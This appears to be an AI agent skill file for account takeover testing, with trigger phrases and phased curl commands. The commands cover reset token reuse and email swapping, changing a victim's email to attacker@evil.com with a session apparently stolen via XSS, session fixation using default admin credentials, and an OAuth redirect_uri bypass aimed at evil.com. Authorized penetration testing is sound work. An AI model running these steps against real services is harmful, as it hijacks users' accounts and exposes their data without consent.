---
name: vuln-account-takeover
description: "Account takeover (ATO) testing — password reset flaws, OAuth misconfig, session fixation, CSRF chain to ATO, XSS cookie theft, IDOR-based ATO, credential stuffing, email change without verification. Triggers: 'account takeover', 'ato', 'account hijack', 'session hijack', 'credential theft', 'oauth ato', 'reset token abuse', 'account compromise'."
---

# Account Takeover (ATO) Testing

Chain vulnerabilities to achieve unauthorized account access.

---

## Phase 1: Password Reset Flaws

```bash
TARGET="https://TARGET"

curl -s -X POST "$TARGET/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'

TOKEN="CAPTURED_RESET_TOKEN"
curl -s -X POST "$TARGET/api/password/change" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass123!\"}"

curl -s -X POST "$TARGET/api/password/change" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass456!\"}"

curl -s -X POST "$TARGET/api/password/change" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"USER_A_TOKEN\",\"email\":\"userb@target.com\",\"password\":\"hacked\"}"
```

---

## Phase 2: Email Change Without Verification

```bash
TARGET="https://TARGET"
ATTACKER_EMAIL="attacker@evil.com"
SESSION="VICTIM_TOKEN_VIA_XSS_OR_OTHER"

curl -s -X PUT "$TARGET/api/account/email" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$ATTACKER_EMAIL\"}"

curl -s -X POST "$TARGET/api/password/reset" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$ATTACKER_EMAIL\"}"
```

---

## Phase 3: Session Fixation

```bash
TARGET="https://TARGET"

FIXED_SESSION=$(curl -s -c - "$TARGET/login" | grep "session" | awk '{print $7}')

curl -s "$TARGET/api/profile" -H "Cookie: session=$FIXED_SESSION"

SESSION_BEFORE="PREAUTH_SESSION"
curl -s -X POST "$TARGET/api/login" \
  -H "Cookie: session=$SESSION_BEFORE" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'
curl -s "$TARGET/api/profile" -H "Cookie: session=$SESSION_BEFORE"
```

---

## Phase 4: OAuth-Based ATO

```bash
TARGET="https://TARGET"

AUTH_URL="https://auth.TARGET/oauth/authorize"
curl -s "$AUTH_URL?client_id=CLIENT_ID&redirect_uri=https://TARGET.com/callback%20@evil.com&response_type=code"
```

---

## Output

Save to `output/`:
- `ato_poc.txt` — reproduction steps for account takeover
- `ato_chain.txt` — vulnerabilities chained for ATO

## Next Phase

→ `pentest-report` to document findings with business impact
